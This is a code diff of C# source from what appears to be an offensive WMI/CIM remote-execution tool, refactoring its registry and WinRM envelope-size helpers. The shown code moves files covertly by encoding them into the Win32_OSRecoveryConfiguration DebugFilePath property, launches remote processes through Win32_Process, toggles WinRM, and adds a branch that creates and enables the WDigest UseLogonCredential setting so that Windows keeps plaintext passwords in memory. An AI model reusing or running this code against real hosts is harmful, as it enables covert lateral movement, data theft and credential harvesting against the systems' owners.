@@ -356,13 +356,13 @@ namespace Execute
             string originalWmiProperty = GetOsRecovery(cimSession);
             bool wsman = true;
             bool resetEnvSize = false;
+            int envSize = 500;
 
             Messenger.GoodMessage("[+] Downloading file: " + downloadPath + "\n");
 
             if (wsman == true)
             {
                 int fileSize = GetFileSize(downloadPath, cimSession);
-                int envSize = 500;
 
                 // We can modify this later easily to pass wsman if needed
                 using (PowerShell powershell = PowerShell.Create())
@@ -380,6 +380,8 @@ namespace Execute
                             Messenger.WarningMessage(
                                 "[*] Warning: The file size is greater than 450 KB, setting the maxEnvelopeSizeKB higher...");
                             envSize = fileSize / 1024 > 250000 ? 999999999 : 256000;
+                            EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
+                            EnvelopeSize.SetMaxEnvelopeSize(envSize.ToString(), cimSession);
                         }
 
                         string command1 = "$data = Get-Content -Encoding byte -ReadCount 0 -Path '" + downloadPath +
@@ -388,19 +390,14 @@ namespace Execute
                         const string command3 =
                             @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
 
-                        if (resetEnvSize)
-                        {
-                            SetLocalMaxEnvelopeSize(envSize);
-                            string setEnv = "Set-Item -Path WSMan:\\localhost\\maxEnvelopeSizeKB -Value " + envSize;
-                            powershell.Commands.AddScript(setEnv, false);
-                        }
-
                         if (powershell.Runspace.ConnectionInfo != null)
                         {
                             powershell.Commands.AddScript(command1, false);
                             powershell.Commands.AddScript(command2, false);
                             powershell.Commands.AddScript(command3, false);
                             powershell.Invoke();
+
+
                         }
                         else
                             wsman = false;
@@ -422,18 +419,19 @@ namespace Execute
                 if (fileSize / 1024 > 450)
                 {
                     resetEnvSize = true;
+                    envSize = fileSize / 1024 > 250000 ? 999999999 : 256000;
                     Messenger.WarningMessage(
                         "[*] Warning: The file size is greater than 450 KB, setting the maxEnvelopeSizeKB higher...");
                     if (fileSize / 1024 > 250000)
                     {
-                        SetLocalMaxEnvelopeSize(999999999);
-                        SetMaxEnvelopeSize(999999999,
+                        EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
+                        EnvelopeSize.SetMaxEnvelopeSize("999999999",
                             cimSession); // This is the largest value we can set, so not sure if this will work
                     }
                     else
                     {
-                        SetLocalMaxEnvelopeSize(256000);
-                        SetMaxEnvelopeSize(256000, cimSession);
+                        EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
+                        EnvelopeSize.SetMaxEnvelopeSize("256000", cimSession);
                     }
                 }
 
@@ -453,14 +451,14 @@ namespace Execute
             }
 
             // Give it a second to write and check for changes to DebugFilePath
-            System.Threading.Thread.Sleep(1000);
+            Thread.Sleep(1000);
             Messenger.WarningMessage("\n[*] Checking for a modified DebugFilePath and grabbing the data. This may take a while if the file is large (USE WMI IF IT IS)\n");
 
             //string[] fileOutput = CheckForFinishedDebugFilePath(originalWMIProperty, cimSession).Split(',');
             string fileOutput = CheckForFinishedDebugFilePath(originalWmiProperty, cimSession);
 
             // We need to pause for a bit here for some reason
-            System.Threading.Thread.Sleep(5000);
+            Thread.Sleep(5000);
 
             //Create list for bytes
             List<byte> outputList = new List<byte>();
@@ -490,8 +488,8 @@ namespace Execute
             if (resetEnvSize)
             {
                 // Set the maxEnvelopeSizeKB back to the default val if we set it previously
-                SetLocalMaxEnvelopeSize(500);
-                SetMaxEnvelopeSize(500, cimSession);
+                EnvelopeSize.SetLocalMaxEnvelopeSize(500);
+                EnvelopeSize.SetMaxEnvelopeSize("500", cimSession);
             }
 
             return true;
@@ -610,6 +608,7 @@ namespace Execute
             string originalWmiProperty = GetOsRecovery(cimSession);
             bool wsman = true;
             bool resetEnvSize = false;
+            int envSize = 500;
 
             Messenger.GoodMessage("[+] Uploading file: " + uploadFile + " to " + writePath);
             Messenger.GoodMessage("--------------------------------------------------------------------\n");
@@ -620,18 +619,19 @@ namespace Execute
             if (fileSize / 1024 > 450)
             {
                 resetEnvSize = true;
+                envSize = fileSize / 1024 > 250000 ? 999999999 : 256000;
                 Messenger.WarningMessage(
                     "[*] Warning: The file size is greater than 450 KB, setting the maxEnvelopeSizeKB higher...");
                 if (fileSize / 1024 > 250000)
                 {
-                    SetLocalMaxEnvelopeSize(999999999);
-                    SetMaxEnvelopeSize(999999999,
+                    EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
+                    EnvelopeSize.SetMaxEnvelopeSize("999999999",
                         cimSession); // This is the largest value we can set, so not sure if this will work
                 }
                 else
                 {
-                    SetLocalMaxEnvelopeSize(256000);
-                    SetMaxEnvelopeSize(256000, cimSession);
+                    EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
+                    EnvelopeSize.SetMaxEnvelopeSize("256000", cimSession);
                 }
             }
 
@@ -718,8 +718,8 @@ namespace Execute
             if (resetEnvSize)
             {
                 // Set the maxEnvelopeSizeKB back to the default val if we set it previously
-                SetLocalMaxEnvelopeSize(500);
-                SetMaxEnvelopeSize(500, cimSession);
+                EnvelopeSize.SetLocalMaxEnvelopeSize(500);
+                EnvelopeSize.SetMaxEnvelopeSize("500", cimSession);
             }
 
             return true;
@@ -924,34 +924,19 @@ namespace Execute
             CimSession cimSession = planter.Connector.ConnectedCimSession;
 
             // Create the parameters and create the new process. Broken out to make it easier to follow what's up
-            CimMethodParametersCollection cimParams = new CimMethodParametersCollection
-            {
-                CimMethodParameter.Create("hDefKey", 0x80000002, CimFlags.In),
-                CimMethodParameter.Create("sSubKeyName",
-                    "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", CimFlags.In),
-                CimMethodParameter.Create("sValueName", "UseLogonCredential", CimFlags.In)
-            };
+            CimMethodResult results = RegistryMod.CheckRegistryCim("GetDWORDValue", 0x80000002,
+                "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
+                "UseLogonCredential", cimSession);
 
-            CimMethodResult results =
-                cimSession.InvokeMethod(new CimInstance("StdRegProv", Namespace), "GetDWORDValue", cimParams);
-
+            
             if (Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0)
             {
                 if (results.OutParameters["uValue"].Value.ToString() != "0")
                 {
                     // wdigest is enabled, let's disable it
-
-                    CimMethodParametersCollection cimParamsSet = new CimMethodParametersCollection
-                    {
-                        CimMethodParameter.Create("hDefKey", 0x80000002, CimFlags.In),
-                        CimMethodParameter.Create("sSubKeyName",
-                            "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", CimFlags.In),
-                        CimMethodParameter.Create("sValueName", "UseLogonCredential", CimFlags.In),
-                        CimMethodParameter.Create("uValue", Convert.ToUInt32(0), CimFlags.In)
-                    };
-
-                    CimMethodResult resultsSet = cimSession.InvokeMethod(new CimInstance("StdRegProv", Namespace),
-                        "SetDWORDValue", cimParamsSet);
+                    CimMethodResult resultsSet = RegistryMod.SetRegistryCim("SetDWORDValue", 0x80000002,
+                        "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
+                        "UseLogonCredential", data:"0", cimSession);
 
                     if (Convert.ToUInt32(resultsSet.ReturnValue.Value.ToString()) == 0)
                         Console.WriteLine("Successfully disabled wdigest");
@@ -975,30 +960,19 @@ namespace Execute
             CimSession cimSession = planter.Connector.ConnectedCimSession;
 
             // Create the parameters and create the new process. Broken out to make it easier to follow what's up
-            CimMethodParametersCollection cimParams = new CimMethodParametersCollection
-                {
-                    CimMethodParameter.Create("hDefKey", 0x80000002, CimFlags.In),
-                    CimMethodParameter.Create("sSubKeyName", "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", CimFlags.In),
-                    CimMethodParameter.Create("sValueName", "UseLogonCredential", CimFlags.In)
-                };
-
-            CimMethodResult results = cimSession.InvokeMethod(new CimInstance("StdRegProv", Namespace), "GetDWORDValue", cimParams);
+            // Let's use the already created method we have eh? :)
+            CimMethodResult results = RegistryMod.CheckRegistryCim("GetDWORDValue", 0x80000002,
+                "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
+                "UseLogonCredential", cimSession);
 
             if (Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0)
             {
                 if (results.OutParameters["uValue"].Value.ToString() == "0")
                 {
                     // wdigest is disabled, let's enable it
-
-                    CimMethodParametersCollection cimParamsSet = new CimMethodParametersCollection
-                        {
-                            CimMethodParameter.Create("hDefKey", 0x80000002, CimFlags.In),
-                            CimMethodParameter.Create("sSubKeyName", "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", CimFlags.In),
-                            CimMethodParameter.Create("sValueName", "UseLogonCredential", CimFlags.In),
-                            CimMethodParameter.Create("uValue", Convert.ToUInt32(1), CimFlags.In)
-                        };
-
-                    CimMethodResult resultsSet = cimSession.InvokeMethod(new CimInstance("StdRegProv", Namespace), "SetDWORDValue", cimParamsSet);
+                    CimMethodResult resultsSet = RegistryMod.SetRegistryCim("SetDWORDValue", 0x80000002,
+                        "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
+                        "UseLogonCredential", data:"1", cimSession);
 
                     if (Convert.ToUInt32(resultsSet.ReturnValue.Value.ToString()) == 0)
                         Console.WriteLine("Successfully enabled wdigest");
@@ -1007,6 +981,18 @@ namespace Execute
                 }
                 else
                     Console.WriteLine("wdigest already enabled");
+            }
+            else if (Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 1)
+            {
+                // wdigest key is not found, let's create it
+                CimMethodResult resultsSet = RegistryMod.SetRegistryCim("SetDWORDValue", 0x80000002,
+                    "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
+                    "UseLogonCredential", data: "1", cimSession);
+
+                if (Convert.ToUInt32(resultsSet.ReturnValue.Value.ToString()) == 0)
+                    Console.WriteLine("Successfully created and enabled wdigest");
+                else
+                    Console.WriteLine("Error enabling wdigest");
             }
             else
             {
@@ -1033,7 +1019,7 @@ namespace Execute
                 cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);
 
             // Give it a second to write
-            System.Threading.Thread.Sleep(1000);
+            Thread.Sleep(1000);
 
             Console.WriteLine(Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0
                 ? "Successfully disabled WinRM"
@@ -1058,7 +1044,7 @@ namespace Execute
                 cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);
 
             // Give it a second to write
-            System.Threading.Thread.Sleep(1000);
+            Thread.Sleep(1000);
 
             Console.WriteLine(Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0
                 ? "Successfully enabled WinRM"
@@ -1116,7 +1102,7 @@ namespace Execute
 
                 // Let's get the proper method depending on the type of data
                 GetMethods method = new GetMethods(passedRegValType.ToUpper());
-                SetRegistry(method.RegSetMethod, regRootValues[defKey], regKey, regSubKey, regValue, cimSession);
+                RegistryMod.SetRegistryCim(method.RegSetMethod, regRootValues[defKey], regKey, regSubKey, regValue, cimSession);
             }
 
             string pulledRegValType;
@@ -1128,7 +1114,7 @@ namespace Execute
                         GetMethods method = null;
                         try
                         {
-                            pulledRegValType = CheckRegistryType(regRootValues[defKey], regKey, regSubKey, cimSession);
+                            pulledRegValType = RegistryMod.CheckRegistryTypeCim(regRootValues[defKey], regKey, regSubKey, cimSession);
                             method = new GetMethods(pulledRegValType);
                         }
                         catch (TargetInvocationException)
@@ -1142,8 +1128,10 @@ namespace Execute
                             System.Environment.Exit(1);
                         }
 
-                        if (CheckRegistry(method.RegGetMethod, regRootValues[defKey], regKey, regSubKey, cimSession))
-                            DeleteRegistry(regRootValues[defKey], regKey, regSubKey, cimSession);
+                        CimMethodResult resultDel = RegistryMod.CheckRegistryCim(method.RegGetMethod,
+                            regRootValues[defKey], regKey, regSubKey, cimSession);
+                        if (Convert.ToUInt32(resultDel.ReturnValue.Value.ToString()) == 0)
+                            RegistryMod.DeleteRegistryCim(regRootValues[defKey], regKey, regSubKey, cimSession);
                         else
                         {
                             Console.WriteLine("Issue deleting registry value");
@@ -1156,7 +1144,7 @@ namespace Execute
                     GetMethods method = null;
                     try
                     {
-                        pulledRegValType = CheckRegistryType(regRootValues[defKey], regKey, regSubKey, cimSession);
+                        pulledRegValType = RegistryMod.CheckRegistryTypeCim(regRootValues[defKey], regKey, regSubKey, cimSession);
                         method = new GetMethods(pulledRegValType);
                     }
                     catch (TargetInvocationException)
@@ -1170,9 +1158,12 @@ namespace Execute
                         System.Environment.Exit(1);
                     }
 
-                    if (CheckRegistry(method.RegGetMethod, regRootValues[defKey], regKey, regSubKey, cimSession))
+                    //Let's check the reg
+                    CimMethodResult resultMod = RegistryMod.CheckRegistryCim(method.RegGetMethod, regRootValues[defKey],
+                        regKey, regSubKey, cimSession);
+                    if (Convert.ToUInt32(resultMod.ReturnValue.Value.ToString()) == 0)
                     {
-                        SetRegistry(method.RegSetMethod, regRootValues[defKey], regKey, regSubKey, regValue,
+                        RegistryMod.SetRegistryCim(method.RegSetMethod, regRootValues[defKey], regKey, regSubKey, regValue,
                             cimSession);
                     }
                     else
@@ -2043,181 +2034,10 @@ namespace Execute
             return Convert.ToInt32(queryInstance.First().CimInstanceProperties["FileSize"].Value);
         }
 
-        public void SetLocalMaxEnvelopeSize(int envelopeSize)
-        {
-            Messenger.WarningMessage("[*] Setting the MaxEnvelopeSizeKB on the local system to " + envelopeSize);
-            string fullCommand = "Set-Item -Path WSMan:\\localhost\\maxEnvelopeSizeKB -Value " + envelopeSize;
 
-            // Create a local runspace to run the powershell command
-            using (PowerShell powershell = PowerShell.Create())
-            {
-                try
-                {
-                    // We need to check for admin access before we run otherwise the whole process fails
-                    bool isElevated;
-                    using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
-                    {
-                        WindowsPrincipal principal = new WindowsPrincipal(identity);
-                        isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
-                    }
 
-                    if (isElevated)
-                    {
-                        powershell.AddScript("Set-Item -Path WSMan:\\localhost\\maxEnvelopeSizeKB -Value " + envelopeSize);
-                        powershell.Invoke();
-                    }
-                    else
-                    {
-                        Messenger.ErrorMessage("\n[-] Error: You must be running in an admininistrative context to use the download command with CIM (due to maxEnvelopeSizeKB)," +
-                            " \n[-] Use WMI (--wmi) instead if you can't or don't want to run as admin on local computer.");
-                        System.Environment.Exit(1);
-                    }
-                }
-                catch (Exception e)
-                {
-                    Messenger.ErrorMessage(
-                        $"[-] Error: Unable to create local runspace to change maxEnvelopeSizeKB. \nPlease run: {fullCommand} on the local system\n\n");
-                    Console.WriteLine(e);
-                }
-            }
-        }
 
-        public void SetMaxEnvelopeSize(int envelopeSize, CimSession cimSession)
-        {
-            Messenger.WarningMessage("[*] Setting the MaxEnvelopeSizeKB on the remote system to " + envelopeSize);
-            string fullCommand = "Set-Item -Path WSMan:\\localhost\\maxEnvelopeSizeKB -Value " + envelopeSize;
 
-            // Create the parameters and create the new process. Broken out to make it easier to follow what's up
-            CimMethodParametersCollection cimParams = new CimMethodParametersCollection
-            {
-                CimMethodParameter.Create("CommandLine", "powershell " + fullCommand, CimFlags.In)
-            };
-
-            // We only need the first instance
-            CimMethodResult results = cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);
-            if (Convert.ToUInt32(results.ReturnValue.Value) != 0)
-                Messenger.ErrorMessage("[-] Error: Not able to set the remote maxEnvelopeSizeKB. This command will probably fail");
-
-            // We shouldn't need this, and yet it must be in here
-            System.Threading.Thread.Sleep(5000);
-        }
-
-        public bool CheckRegistry(string regMethod, uint defKey, string regSubKey, string regSubKeyValue, CimSession cs)
-        {
-            // Block to be used to check the registry for specific values (before modifying or deleting)
-            CimMethodParametersCollection cimParams = new CimMethodParametersCollection
-            {
-                CimMethodParameter.Create("hDefKey", defKey, CimFlags.In),
-                CimMethodParameter.Create("sSubKeyName", regSubKey, CimFlags.In),
-                CimMethodParameter.Create("sValueName", regSubKeyValue, CimFlags.In)
-            };
-
-            CimMethodResult results = cs.InvokeMethod(new CimInstance("StdRegProv", Namespace), regMethod, cimParams);
-
-            if (Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0)
-                return true;
-            
-            Messenger.ErrorMessage("[-] Registry key not valid, not modifying or deleting");
-            Console.WriteLine("\nFull key provided: " + regSubKey + "\n" + "Value provided: " + regSubKeyValue);
-            return false;
-        }
-
-        public string CheckRegistryType(uint defKey, string regSubKey, string regSubKeyValue, CimSession cs)
-        {
-            // Block to be used to check the registry for specific values (before modifying or deleting)
-            const int REG_SZ = 1;
-            const int REG_EXPAND_SZ = 2;
-            const int REG_BINARY = 3;
-            const int REG_DWORD = 4;
-            const int REG_MULTI_SZ = 7;
-            int type;
-
-            CimMethodParametersCollection cimParams = new CimMethodParametersCollection
-            {
-                CimMethodParameter.Create("hDefKey", defKey, CimFlags.In),
-                CimMethodParameter.Create("sSubKeyName", regSubKey, CimFlags.In),
-            };
-
-            CimMethodResult results = cs.InvokeMethod(new CimInstance("StdRegProv", Namespace), "EnumValues", cimParams);
-
-            //Hacky way to get the type from the returned arrays
-            try
-            {
-                type = ((int[])results.OutParameters["Types"].Value)[Array.IndexOf((string[])results.OutParameters["sNames"].Value, regSubKeyValue)];
-            }
-            catch (TargetInvocationException e)
-            {
-                Console.WriteLine(e);
-                throw;
-            }
-
-            switch (type)
-            {
-                case REG_SZ:
-                    return "REG_SZ";
-                case REG_EXPAND_SZ:
-                    return "REG_EXPAND_SZ";
-                case REG_BINARY:
-                    return "REG_BINARY";
-                case REG_DWORD:
-                    return "REG_DWORD";
-                case REG_MULTI_SZ:
-                    return "REG_MULTI_SZ";
-            }
-            return null;
-        }
-
-        public bool SetRegistry(string regMethod, uint defKey, string regSubKey, string regSubKeyValue, string data, CimSession cs)
-        {
-            // Block to be used to set the registry for specific values
-            CimMethodParametersCollection cimParamsSetReg = new CimMethodParametersCollection
-            {
-                CimMethodParameter.Create("hDefKey", defKey, CimFlags.In),
-                CimMethodParameter.Create("sSubKeyName", regSubKey, CimFlags.In),
-                CimMethodParameter.Create("sValueName", regSubKeyValue, CimFlags.In)
-            };
-
-            switch (regMethod)
-            {
-                // Need diff values for different methods
-                case "SetStringValue":
-                    cimParamsSetReg.Add(CimMethodParameter.Create("sValue", data, CimFlags.In));
-                    break;
-                case "SetDWORDValue":
-                    cimParamsSetReg.Add(CimMethodParameter.Create("uValue", Convert.ToUInt32(data), CimFlags.In));
-                    break;
-            }
-
-            CimMethodResult results = cs.InvokeMethod(new CimInstance("StdRegProv", Namespace), regMethod, cimParamsSetReg);
-
-            if (Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0)
-                return true;
-
-            Messenger.ErrorMessage("[-] Error modifying key");
-            Console.WriteLine("\nFull key provided: " + regSubKey + "\n" + "Value provided: " + regSubKeyValue);
-            return false;
-        }
-
-        public bool DeleteRegistry(uint defKey, string regSubKey, string regSubKeyValue, CimSession cs)
-        {
-            // Block to be used to delete the registry for specific values
-
-            CimMethodParametersCollection cimParams = new CimMethodParametersCollection
-            {
-                CimMethodParameter.Create("hDefKey", defKey, CimFlags.In),
-                CimMethodParameter.Create("sSubKeyName", regSubKey, CimFlags.In),
-                CimMethodParameter.Create("sValueName", regSubKeyValue, CimFlags.In)
-            };
-
-            CimMethodResult results = cs.InvokeMethod(new CimInstance("StdRegProv", Namespace), "DeleteValue", cimParams);
-
-            if (Convert.ToUInt32(results.ReturnValue.Value) == 0)
-                return true;
-            
-            Messenger.ErrorMessage("[-] Error deleting key");
-            Console.WriteLine("\nFull key provided: " + regSubKey + "\n" + "Value provided: " + regSubKeyValue);
-            return false;
-        }
 
         public string CheckForFinishedDebugFilePath(string originalWmiProperty, CimSession cimSession)
         {
